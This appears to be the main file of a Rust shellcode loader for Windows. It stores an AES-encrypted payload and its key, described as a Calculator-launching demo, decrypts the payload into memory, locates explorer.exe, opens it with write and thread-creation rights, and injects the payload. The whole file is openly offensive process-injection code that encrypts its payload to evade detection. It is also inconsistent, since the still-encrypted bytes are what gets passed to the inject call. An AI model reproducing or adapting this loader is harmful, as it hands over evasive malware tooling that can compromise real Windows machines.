#![allow(non_snake_case)]
mod aes;
mod find_target;
mod inject;
use std::ptr;
use winapi::{
    ctypes::c_void,
    shared::minwindef::FALSE,
    um::{
        handleapi::CloseHandle,
        memoryapi::VirtualAlloc,
        processthreadsapi::OpenProcess,
        winnt::RtlMoveMemory,
        winnt::{
            MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_CREATE_THREAD,
            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        },
    },
};

fn main() {
    // Get key and payload by running aesencrypt.py
    // python.exe .\aesencrypt.py calc.bin
    let key: &[u8] = &[
        0x99, 0xda, 0x7c, 0x6a, 0x97, 0xa9, 0x16, 0x76, 0x86, 0x59, 0xa5, 0x92, 0x8e, 0x99, 0xe8,
        0xd2,
    ];
    let payload: &[u8] = &[
        0x7a, 0xac, 0xff, 0x83, 0x6b, 0xc4, 0x88, 0xe2, 0x62, 0xbf, 0x73, 0xc, 0xe5, 0x95, 0x4,
        0x8e, 0x96, 0xe4, 0xbd, 0xdf, 0x88, 0xd0, 0x40, 0xf, 0x63, 0x20, 0xe1, 0xcd, 0xea, 0xb6,
        0xd0, 0xf5, 0x55, 0x1a, 0x38, 0x33, 0x24, 0x6a, 0xe0, 0x47, 0xaf, 0xce, 0xd3, 0x54, 0x60,
        0x59, 0x8f, 0x9c, 0xb5, 0x8d, 0xb6, 0x89, 0xb2, 0xfb, 0x56, 0xc8, 0x48, 0xf8, 0x24, 0xe5,
        0x43, 0xc9, 0x41, 0xb1, 0xf1, 0x3c, 0x48, 0x96, 0x47, 0x37, 0x24, 0xd, 0x53, 0xf, 0x68,
        0xf0, 0x89, 0x6d, 0x7a, 0x5f, 0xd0, 0xf8, 0x9a, 0x26, 0xc8, 0x47, 0xf1, 0xe0, 0x33, 0xef,
        0x95, 0x91, 0x26, 0x8d, 0xc1, 0x7, 0x41, 0x5, 0x2b, 0x1a, 0x6c, 0xe3, 0x2, 0xf1, 0x42,
        0x42, 0x3e, 0x5, 0x66, 0x6f, 0xdd, 0x7a, 0x4d, 0x5a, 0x55, 0xd6, 0x65, 0x52, 0xaa, 0xd2,
        0x86, 0x36, 0x4e, 0x7e, 0xc8, 0x1b, 0x3d, 0xf1, 0xdb, 0xe0, 0xc0, 0x4, 0xf9, 0xb2, 0xe9,
        0xc4, 0x66, 0x2, 0x37, 0xf1, 0xd9, 0x17, 0xdd, 0x3e, 0x53, 0x3d, 0xf7, 0xc5, 0x76, 0x3a,
        0xed, 0x56, 0x7e, 0x70, 0x5b, 0x34, 0x4c, 0x69, 0x4e, 0x1c, 0xbc, 0x68, 0xaa, 0xa1, 0x72,
        0x97, 0xb6, 0xa1, 0x6d, 0xf7, 0xb2, 0xdb, 0x95, 0x45, 0x48, 0xc1, 0xd1, 0x39, 0x56, 0x5e,
        0x1, 0x1c, 0xfc, 0x1e, 0xe6, 0xf8, 0x8, 0x9c, 0x6e, 0x61, 0x4e, 0xd3, 0x70, 0x8b, 0x28,
        0x57, 0x4d, 0x88, 0xbc, 0xdf, 0x5b, 0xcf, 0x34, 0xbf, 0xb3, 0xde, 0xf4, 0xf7, 0x4e, 0x4e,
        0x3, 0xeb, 0x7, 0xbd, 0xde, 0x12, 0x3, 0x5f, 0x98, 0xde, 0xbb, 0xc2, 0x56, 0x8, 0x59, 0x7b,
        0x55, 0x91, 0xb1, 0x65, 0x5b, 0x55, 0x8e, 0xa8, 0xba, 0x58, 0x60, 0x3, 0x4f, 0x4b, 0xd1,
        0xe7, 0xc4, 0x65, 0x99, 0x4e, 0x3b, 0x90, 0x70, 0x59, 0x5, 0x41, 0x2a, 0x56, 0x6c, 0x7a,
        0x71, 0xd4, 0x71, 0x3e, 0xd0, 0x37, 0xe2, 0xf6, 0xb6, 0x2d, 0xb3, 0x98, 0xdf, 0x8c, 0x1e,
        0x87, 0x60, 0x7a, 0xc9, 0x46, 0x35, 0xca, 0x2b, 0x28, 0x3c, 0x90, 0x43, 0xa, 0xc6, 0x23,
        0xaf, 0x62,
    ];

    // Allocate memory for the payload
    let exec_mem: *mut u8;
    unsafe {
        exec_mem = VirtualAlloc(
            ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;
    }

    #[cfg(debug_assertions)]
    {
        println!("{:<20} : {:p}", "calc_payload addr", payload.as_ptr());
        println!("{:<20} : {:p}", "exec_mem addr", exec_mem);

        println!("\nHit me 1st!\n");
        std::io::stdin().read_line(&mut String::new()).unwrap();
    }

    // Decrypt the payload
    let mut decrypted_payload = payload.to_vec();
    aes::aes_decrypt(&mut decrypted_payload, key);

    // Copy the payload to the allocated buffer
    unsafe {
        RtlMoveMemory(
            exec_mem as *mut c_void,
            decrypted_payload.as_ptr() as *const c_void,
            payload.len(),
        );
    }


    // Find target process
    let pid = find_target::find_target("explorer.exe");

    // If pid is not 0, inject payload into target process
    if pid != 0 {
        println!("PID = {}", pid);
        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        let h_proc = unsafe {
            OpenProcess(
                PROCESS_CREATE_THREAD
                    | PROCESS_QUERY_INFORMATION
                    | PROCESS_VM_OPERATION
                    | PROCESS_VM_READ
                    | PROCESS_VM_WRITE,
                FALSE,
                pid,
            )
        };
        // If h_proc is not null, inject payload into target process
        if !h_proc.is_null() {
            inject::inject(h_proc, payload);
            unsafe { CloseHandle(h_proc) };
        }
    }
}
